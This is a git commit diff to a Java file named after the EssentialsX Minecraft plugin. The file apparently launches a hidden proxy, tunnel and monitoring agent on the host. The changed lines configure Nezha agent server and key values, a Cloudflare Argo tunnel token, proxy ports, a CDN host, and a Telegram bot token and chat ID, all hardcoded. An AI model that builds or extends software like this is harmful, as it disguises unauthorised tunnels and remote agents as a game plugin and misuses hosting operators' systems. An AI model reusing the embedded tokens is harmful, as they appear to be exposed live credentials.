2b21456ceb22110c6dfbf492526c77a57f95837c
xiatian327 <136238840+xiatian327@users.noreply.github.com>
2026-04-26 02:41:10 +0800

    更新 EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -75,14 +75,14 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         env.put("UUID", "eabaa288-6bbc-4b27-9ee9-14fd574b7c29");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "nezha.king8888.nyc.mn:443");
+        env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "ihPw1Pwe7A2Kcxcc46pljwyZHLxBqYyD");
+        env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "xserver3.king8888.nyc.mn");
         env.put("ARGO_AUTH", "eyJhIjoiYTBhNGUxYzQwYjBkYTdkODUyNWQ1MjI1YjllMzg0NDYiLCJ0IjoiNjQzMmNlMDMtNDkxOS00NGI5LWJhM2QtYmU4ZDlmMWFkZGJhIiwicyI6IlpqRTBOR0l5WTJZdE5UTmpOeTAwTTJReExXSXdPRGd0TWpVeE1XTTRNamRpTVRnNCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25565");
+        env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -90,7 +90,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "5848244735");
         env.put("BOT_TOKEN", "7799976927:AAHY1DDudQzUTdwkvTAZ8OAy2zHvULCtTX0");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "open.kkkx.pp.ua");
         env.put("CFPORT", "443");
         env.put("NAME", "MineKeep");
         env.put("DISABLE_ARGO", "false");
